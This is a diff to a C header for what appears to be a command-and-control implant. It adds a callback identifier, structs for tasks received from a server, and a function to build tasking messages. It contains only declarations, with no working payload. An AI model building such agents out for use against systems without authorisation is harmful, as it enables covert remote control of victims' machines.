@@ -5,6 +5,7 @@
 
 typedef struct AgentParams {
 	char *payload_uuid;
+	char *callback_uuid;
 	char *callback_host;
 	int callback_port;
 	int callback_https;
@@ -26,12 +27,27 @@ typedef struct TaskingRequest {
 	char tasking_size;
 } TaskingRequest;
 
+typedef struct TaskInfo {
+	char *id;
+	char *command;
+	char *parameters;
+	unsigned int timestamp;
+} TaskInfo;
+
+typedef struct TaskingReply {
+	char action;
+	char tasking_size;
+	TaskInfo *tasks;
+} TaskingReply;
+
 void append_str(char *string, char *append);
 void base64_encode(const char *in, const unsigned long in_len, char *out);
 
 char *generate_checkin_message(CheckinRequest *checkin);
 void parse_checkin_reply(HttpResponse *response, CheckinReply *reply);
 void free_checkin_reply(CheckinReply *reply);
+
+char *generate_tasking_message(TaskingRequest *tasking);
 
 char *unpack_str(char *raw_params, int *offset);
 int unpack_int(char *raw_params, int *offset);
